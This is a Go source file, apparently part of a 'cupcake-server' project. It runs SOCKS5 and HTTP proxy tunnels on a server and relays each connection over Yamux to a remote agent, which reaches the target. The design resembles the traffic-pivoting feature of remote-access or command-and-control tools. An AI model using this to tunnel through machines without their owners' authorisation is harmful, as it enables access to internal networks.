package services

import (
    "bufio"
    "crypto/subtle"
    "encoding/base64"
    "encoding/binary"
    "fmt"
    "io"
    "log"
    "net"
    "net/http"
    "strconv"
    "strings"
    "sync"
    "time"
    "cupcake-server/pkg/globals"
    "cupcake-server/internal/model"
    "cupcake-server/internal/storage"
    "cupcake-server/pkg/utils"
)

type Tunnel struct {
    Port      string `json:"port"`
    AgentID   string `json:"agent_id"`
    Type      string `json:"type"`   // "socks5" or "http"
    Status    string `json:"status"`
    Username  string `json:"username"`
    Password  string `json:"password"`
    listener  net.Listener
}

var (
    activeTunnels = make(map[string]*Tunnel)
    tunnelMutex   sync.RWMutex
)

// ValidateTunnelPort normalizes and validates a TCP port for tunnels.
// Empty port is rejected (would bind a random ephemeral port and orphan the map key).
func ValidateTunnelPort(port string) (string, error) {
	port = strings.TrimSpace(port)
	if port == "" {
		return "", fmt.Errorf("port is required")
	}
	// Reject non-numeric junk (strconv.Atoi accepts leading spaces only after TrimSpace).
	n, err := strconv.Atoi(port)
	if err != nil {
		return "", fmt.Errorf("invalid port %q", port)
	}
	if n < 1 || n > 65535 {
		return "", fmt.Errorf("port out of range (1-65535): %d", n)
	}
	// Normalize to decimal string without leading zeros confusion for map keys.
	return strconv.Itoa(n), nil
}

// AgentIsOnline reports whether the agent currently has a live control session.
func AgentIsOnline(agentID string) bool {
	agentID = strings.TrimSpace(agentID)
	if agentID == "" {
		return false
	}
	_, ok := globals.Clients.Load(agentID)
	return ok
}

// storeTunnelPassword returns bcrypt hash for DB/memory. Empty stays empty.
// Already-hashed values (restore path) are returned as-is.
func storeTunnelPassword(password string) (string, error) {
	if password == "" {
		return "", nil
	}
	if store.IsBcryptHash(password) {
		return password, nil
	}
	return store.HashPassword(password)
}

// verifyTunnelAuth checks username (constant-time) and password (bcrypt or legacy plaintext).
func verifyTunnelAuth(gotUser, gotPass, wantUser, storedPass string) bool {
	if wantUser == "" && storedPass == "" {
		return true
	}
	uOK := subtle.ConstantTimeCompare([]byte(gotUser), []byte(wantUser)) == 1
	var pOK bool
	if store.IsBcryptHash(storedPass) {
		pOK = store.CheckPasswordHash(gotPass, storedPass)
	} else {
		// Legacy plaintext rows until next StartTunnel rewrite
		pOK = subtle.ConstantTimeCompare([]byte(gotPass), []byte(storedPass)) == 1
	}
	return uOK && pOK
}

// StartTunnel starts a TCP listener on the VPS for either SOCKS5 or HTTP Proxy.
// password may be plaintext (API create) or bcrypt hash (DB restore).
func StartTunnel(agentID, port, tType, username, password string) error {
    var err error
    port, err = ValidateTunnelPort(port)
    if err != nil {
        return err
    }
    agentID = strings.TrimSpace(agentID)
    if agentID == "" {
        return fmt.Errorf("agent uuid is required")
    }

    tunnelMutex.Lock()
    defer tunnelMutex.Unlock()

    // 1. Check if port is physically occupied in our App memory
    if _, exists := activeTunnels[port]; exists {
        return fmt.Errorf("port %s is already active", port)
    }

    passHash, err := storeTunnelPassword(password)
    if err != nil {
        return fmt.Errorf("hash tunnel password: %w", err)
    }

    // 2. Start Listener
    l, err := net.Listen("tcp", "0.0.0.0:"+port)
    if err != nil {
        return err
    }

    // 3. Register in Memory (password field holds bcrypt hash, never API plaintext after hash)
    activeTunnels[port] = &Tunnel{
        Port:     port,
        AgentID:  agentID,
        Type:     strings.ToLower(tType),
        Status:   "running",
        Username: username,
        Password: passHash,
        listener: l,
    }

    // 4. Start Handler
    go func() {
        defer l.Close()
        for {
            conn, err := l.Accept()
            if err != nil { 
                return // Listener closed
            }
            
            if strings.ToLower(tType) == "http" {
                go handleHTTPConnection(conn, agentID, username, passHash)
            } else {
                go handleSocksConnection(conn, agentID, username, passHash)
            }
        }
    }()

    // 5. Update/Create Database Record (bcrypt only)
    var dbTunnel model.Tunnel
    if err := store.DB.Where("port = ?", port).First(&dbTunnel).Error; err != nil {
        dbTunnel = model.Tunnel{
            Port:     port,
            AgentID:  agentID,
            Mode:     strings.ToUpper(tType),
            Status:   "running",
            Username: username,
            Password: passHash,
        }
    } else {
        dbTunnel.AgentID = agentID
        dbTunnel.Mode = strings.ToUpper(tType)
        dbTunnel.Status = "running"
        dbTunnel.Username = username
        dbTunnel.Password = passHash
    }
    
    if err := store.SaveTunnel(&dbTunnel); err != nil {
        l.Close()
        delete(activeTunnels, port)
        return err
    }

    log.Printf("[%s] Tunnel started on port %s for Agent %s", strings.ToUpper(tType), port, agentID)
    return nil
}

// StopTunnel stops but keeps record
func StopTunnel(port string) error {
    var err error
    port, err = ValidateTunnelPort(port)
    if err != nil {
        return err
    }
    tunnelMutex.Lock()
    defer tunnelMutex.Unlock()

    // 1. Close the Listener (Network Layer)
    if t, exists := activeTunnels[port]; exists {
        if t.listener != nil {
            t.listener.Close()
        }
        // Remove from MEMORY map to release the "lock" on the port
        delete(activeTunnels, port)
    }

    // 2. Update Database Status (Persistence Layer)
    if err := store.UpdateTunnelStatus(port, "stopped"); err != nil {
        return err
    }

    log.Printf("[TUNNEL] Stopped tunnel on port %s", port)
    return nil
}

// DeleteTunnel stops and removes the tunnel record from DB
func DeleteTunnel(port string) error {
    var err error
    port, err = ValidateTunnelPort(port)
    if err != nil {
        return err
    }
    tunnelMutex.Lock()
    defer tunnelMutex.Unlock()

    // 1. Stop if running
    if t, exists := activeTunnels[port]; exists {
        if t.listener != nil {
            t.listener.Close()
        }
        delete(activeTunnels, port) // Remove from memory
    }

    // 2. Remove from Database (Persistent Store)
    if err := store.DeleteTunnel(port); err != nil {
        return err
    }

    log.Printf("[TUNNEL] Deleted tunnel on port %s", port)
    return nil
}

// RestoreTunnels re-starts listeners from database on startup
func RestoreTunnels() {
    var tunnels []model.Tunnel
    store.DB.Where("status = ?", "running").Find(&tunnels)
    
    for _, t := range tunnels {
        if _, err := ValidateTunnelPort(t.Port); err != nil {
            log.Printf("[TUNNEL] Skip restore: invalid port %q for agent %s: %v", t.Port, t.AgentID, err)
            _ = store.UpdateTunnelStatus(t.Port, "stopped")
            continue
        }
        log.Printf("[TUNNEL] Restoring %s tunnel on port %s for Agent %s", t.Mode, t.Port, t.AgentID)
        err := StartTunnel(t.AgentID, t.Port, strings.ToLower(t.Mode), t.Username, t.Password)
        if err != nil {
            log.Printf("[TUNNEL] Failed to restore tunnel on port %s: %v", t.Port, err)
            store.UpdateTunnelStatus(t.Port, "stopped")
        }
    }
}

// TunnelDTO is the enriched data transfer object for the API.
// Password is never returned (hash stays server-side).
type TunnelDTO struct {
    Port      string `json:"port"`
    AgentID   string `json:"agent_id"`
    Type      string `json:"type"`
    Status    string `json:"status"`
    Username  string `json:"username"`
    Password  string `json:"password,omitempty"` // always empty in list responses
    HasAuth   bool   `json:"has_auth"`
    AgentName string `json:"agent_name"`
    AgentIP   string `json:"agent_ip"`
}

// GetActiveTunnels returns a list of all tunnels from DB (running or stopped)
func GetActiveTunnels() []TunnelDTO {
    // 1. Fetch all records from DB
    dbTunnels, err := store.GetAllTunnels()
    if err != nil {
        log.Printf("[TUNNEL] Failed to fetch from DB: %v", err)
        return []TunnelDTO{}
    }

    list := make([]TunnelDTO, 0, len(dbTunnels))
    
    // 2. Map DB models to DTOs
    for _, t := range dbTunnels {
        // Enrichment: Lookup Agent Details
        var name, ip string
        val, exists := globals.Clients.Load(t.AgentID)
        if exists {
            client := val.(*globals.Client)
            name = client.Hostname
            ip = client.IP
        } else {
            name = "Unknown"
            ip = "Offline"
        }

        list = append(list, TunnelDTO{
            Port:      t.Port,
            AgentID:   t.AgentID,
            Type:      strings.ToLower(t.Mode),
            Status:    t.Status,
            Username:  t.Username,
            Password:  "", // never leak hash/plaintext to UI
            HasAuth:   t.Username != "" || t.Password != "",
            AgentName: name,
            AgentIP:   ip,
        })
    }
    return list
}

func handleSocksConnection(conn net.Conn, agentID, user, pass string) {
	defer conn.Close()
	// 🛡️ SOCKS5 握手总超时：防止客户端不发请求导致 goroutine 永久阻塞
	conn.SetDeadline(time.Now().Add(60 * time.Second))
	defer conn.SetDeadline(time.Time{})

	// 🛡️ FIX: Global panic recovery
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[SOCKS] ⚠️ PANIC recovered: %v", r)
		}
	}()

	remoteAddr := conn.RemoteAddr().String()
	log.Printf("[SOCKS] 🔌 New connection from %s (agent=%s)", remoteAddr, agentID)

	// 1. SOCKS5 Handshake
	buf := make([]byte, 258)
	if _, err := io.ReadAtLeast(conn, buf, 2); err != nil {
		log.Printf("[SOCKS] ⚠️ %s: read handshake failed: %v", remoteAddr, err)
		return
	}
	if buf[0] != 0x05 {
		log.Printf("[SOCKS] ⚠️ %s: not SOCKS5 (ver=0x%02x)", remoteAddr, buf[0])
		return
	}

	// Choose Auth Method
	if user != "" && pass != "" {
		log.Printf("[SOCKS] 🔐 %s: auth required, negotiating...", remoteAddr)
		conn.Write([]byte{0x05, 0x02}) // Username/Password Auth (0x02)

		// Auth Negotiation
		header := make([]byte, 2)
		if _, err := io.ReadAtLeast(conn, header, 2); err != nil {
			return
		}
		if header[0] != 0x01 { return }

		uLen := int(header[1])
		uBuf := make([]byte, uLen)
		if _, err := io.ReadAtLeast(conn, uBuf, uLen); err != nil { return }

		pLenBuf := make([]byte, 1)
		if _, err := io.ReadAtLeast(conn, pLenBuf, 1); err != nil { return }
		pLen := int(pLenBuf[0])
		pBuf := make([]byte, pLen)
		if _, err := io.ReadAtLeast(conn, pBuf, pLen); err != nil { return }

		if !verifyTunnelAuth(string(uBuf), string(pBuf), user, pass) {
			log.Printf("[SOCKS] ❌ %s: auth FAILED", remoteAddr)
			conn.Write([]byte{0x01, 0x01}) // Auth Failed
			return
		}
		log.Printf("[SOCKS] ✅ %s: auth OK", remoteAddr)
		conn.Write([]byte{0x01, 0x00}) // Auth Success
	} else {
		log.Printf("[SOCKS] 🔓 %s: no auth required", remoteAddr)
		conn.Write([]byte{0x05, 0x00}) // No Auth
	}

	// 2. Request Details
	// 🛡️ FIX: Read 4-byte header only (VER, CMD, RSV, ATYP) into buf[0:4]
	// buf[:4] limits the first TCP read to 4 bytes, leaving remaining data in kernel buffer
	if _, err := io.ReadAtLeast(conn, buf[:4], 4); err != nil {
		log.Printf("[SOCKS] ⚠️ %s: read request header failed: %v", remoteAddr, err)
		return
	}
	log.Printf("[SOCKS] 📋 %s: request header: VER=0x%02x CMD=0x%02x RSV=0x%02x ATYP=0x%02x", remoteAddr, buf[0], buf[1], buf[2], buf[3])
	if buf[1] != 0x01 {
		log.Printf("[SOCKS] ⚠️ %s: unsupported command 0x%02x (want 0x01 CONNECT)", remoteAddr, buf[1])
		return
	}

	var targetHost string
	var port uint16
	switch buf[3] {
	case 0x03: // Domain Name — read len(1) + domain(N) + port(2)
		if _, err := io.ReadFull(conn, buf[:1]); err != nil {
			log.Printf("[SOCKS] ⚠️ %s: read domain length failed: %v", remoteAddr, err)
			return
		}
		domainLen := int(buf[0])
		if domainLen == 0 || domainLen > 255 {
			log.Printf("[SOCKS] ⚠️ %s: invalid domain length %d", remoteAddr, domainLen)
			return
		}
		domainBuf := make([]byte, domainLen)
		if _, err := io.ReadFull(conn, domainBuf); err != nil {
			log.Printf("[SOCKS] ⚠️ %s: read domain failed: %v", remoteAddr, err)
			return
		}
		targetHost = string(domainBuf)
		if _, err := io.ReadFull(conn, buf[:2]); err != nil {
			log.Printf("[SOCKS] ⚠️ %s: read domain port failed: %v", remoteAddr, err)
			return
		}
		port = binary.BigEndian.Uint16(buf[:2])
	case 0x01: // IPv4 — read IP(4) + port(2)
		if _, err := io.ReadFull(conn, buf[:6]); err != nil {
			log.Printf("[SOCKS] ⚠️ %s: read addr+port failed: %v", remoteAddr, err)
			return
		}
		targetHost = net.IP(buf[:4]).String()
		port = binary.BigEndian.Uint16(buf[4:6])
	default:
		log.Printf("[SOCKS] ⚠️ %s: unsupported address type 0x%02x", remoteAddr, buf[3])
		return
	}
	log.Printf("[SOCKS] 🎯 %s: CONNECT %s:%d", remoteAddr, targetHost, port)

	// 3. Connect to Agent via Yamux
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		log.Printf("[SOCKS] ❌ %s: agent %s not found", remoteAddr, agentID)
		return
	}
	client := val.(*globals.Client)
	session := client.YamuxSession
	if session == nil {
		log.Printf("[SOCKS] ❌ %s: agent %s has nil YamuxSession", remoteAddr, agentID)
		return
	}
	log.Printf("[SOCKS] 🔗 %s: agent Yamux session OK", remoteAddr)

	stream, err := session.Open()
	if err != nil {
		log.Printf("[SOCKS] ❌ %s: session.Open() failed: %v", remoteAddr, err)
		return
	}
	defer stream.Close()
	log.Printf("[SOCKS] ✅ %s: Yamux stream opened", remoteAddr)

	// 4. Send Yamux stream type (SOCKS data plane — not SOCKS5 wire 0x05)
	if _, err := stream.Write([]byte{utils.YamuxStreamSOCKS}); err != nil {
		log.Printf("[SOCKS] ❌ %s: write YamuxStreamSOCKS failed: %v", remoteAddr, err)
		return
	}
	log.Printf("[SOCKS] 📤 %s: sent YamuxStreamSOCKS (0x%02x) to agent", remoteAddr, utils.YamuxStreamSOCKS)

	// 5. Send Target Info to Agent
	sendTargetInfo(stream, targetHost, strconv.Itoa(int(port)))
	log.Printf("[SOCKS] 📤 %s: sent target info (%s:%d)", remoteAddr, targetHost, port)

	// ⚡️ FIX: Wait for Agent ACK with 30s timeout
	stream.SetReadDeadline(time.Now().Add(30 * time.Second))
	ack := make([]byte, 1)
	if _, err := io.ReadFull(stream, ack); err != nil || ack[0] != 0x01 {
		if err != nil {
			log.Printf("[SOCKS] ❌ %s: ACK read error: %v", remoteAddr, err)
		} else {
			log.Printf("[SOCKS] ❌ %s: bad ACK byte 0x%02x", remoteAddr, ack[0])
		}
		conn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	stream.SetReadDeadline(time.Time{})
	log.Printf("[SOCKS] ✅ %s: ACK received, agent connected to target", remoteAddr)

	// 6. Respond to SOCKS Client "Success"
	conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
	log.Printf("[SOCKS] ✅ %s: SOCKS5 success sent, starting data pipe", remoteAddr)

	// 7. Pipe Data with proper cleanup
	go io.Copy(stream, conn)
	io.Copy(conn, stream)
	log.Printf("[SOCKS] 🔚 %s: data pipe finished", remoteAddr)

	conn.Close()
	log.Printf("[SOCKS] 🔚 %s: connection closed", remoteAddr)
}

func handleHTTPConnection(conn net.Conn, agentID, user, pass string) {
	defer conn.Close()

	// 🛡️ FIX: Global panic recovery
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[HTTP] ⚠️ PANIC recovered: %v", r)
		}
	}()

    br := bufio.NewReader(conn)
    req, err := http.ReadRequest(br)
    if err != nil { return }

    // Auth Check (pass is bcrypt hash or legacy plaintext)
    if user != "" && pass != "" {
        auth := req.Header.Get("Proxy-Authorization")
        valid := false
        if strings.HasPrefix(auth, "Basic ") {
            payload, _ := base64.StdEncoding.DecodeString(strings.TrimPrefix(auth, "Basic "))
            pair := strings.SplitN(string(payload), ":", 2)
            if len(pair) == 2 && verifyTunnelAuth(pair[0], pair[1], user, pass) {
                valid = true
            }
        }

        if !valid {
            resp := http.Response{
                StatusCode: 407,
                ProtoMajor: 1,
                ProtoMinor: 1,
                Header:     make(http.Header),
            }
            resp.Header.Set("Proxy-Authenticate", "Basic realm=\"Cupcake Proxy\"")
            resp.Write(conn)
            return
        }
    }

    var targetHost string
    var targetPort string

    if req.Method == "CONNECT" {
        host, port, err := net.SplitHostPort(req.URL.Host)
        if err != nil {
            targetHost = req.URL.Host
            targetPort = "443"
        } else {
            targetHost = host
            targetPort = port
        }
    } else {
        targetHost = req.URL.Hostname()
        targetPort = req.URL.Port()
        if targetPort == "" { targetPort = "80" }
    }

    // 1. Connect to Agent via Yamux
    val, ok := globals.Clients.Load(agentID)
    if !ok { return }
    client := val.(*globals.Client)
    session := client.YamuxSession
    if session == nil { return }

    stream, err := session.Open()
    if err != nil { return }
    defer stream.Close()

    // 2. Send Yamux stream type SOCKS (not SOCKS5 version byte)
    if _, err := stream.Write([]byte{utils.YamuxStreamSOCKS}); err != nil { return }

	// 3. Send Target Info
	sendTargetInfo(stream, targetHost, targetPort)

	// ⚡️ V3.0.1 Fix + Timeout: Wait for Agent's Ack (1 byte) before piping
	stream.SetReadDeadline(time.Now().Add(30 * time.Second))
	ack := make([]byte, 1)
	if _, err := io.ReadFull(stream, ack); err != nil || ack[0] != 0x01 {
		resp := http.Response{
			StatusCode: 502, // Bad Gateway
			ProtoMajor: 1,
			ProtoMinor: 1,
		}
		resp.Write(conn)
		return
	}
	stream.SetReadDeadline(time.Time{}) // 🚨 Clear deadline for data forwarding

    // 4. Handle Protocol Specifics
    if req.Method == "CONNECT" {
        conn.Write([]byte("HTTP/1.1 200 Connection Established\r\n\r\n"))
        go io.Copy(stream, br)
        io.Copy(conn, stream)
    } else {
        req.Write(stream)
        go io.Copy(stream, br)
        io.Copy(conn, stream)
    }

    // 🛡️ FIX: Close conn first to unblock goroutine before stream cleanup
    conn.Close()
}

func sendTargetInfo(w io.Writer, host string, portStr string) {
    portInt, _ := strconv.Atoi(portStr)
    hostBytes := []byte(host)
    header := make([]byte, 1+len(hostBytes)+2)
    header[0] = uint8(len(hostBytes))
    copy(header[1:], hostBytes)
    binary.BigEndian.PutUint16(header[1+len(hostBytes):], uint16(portInt))
    w.Write(header)
}
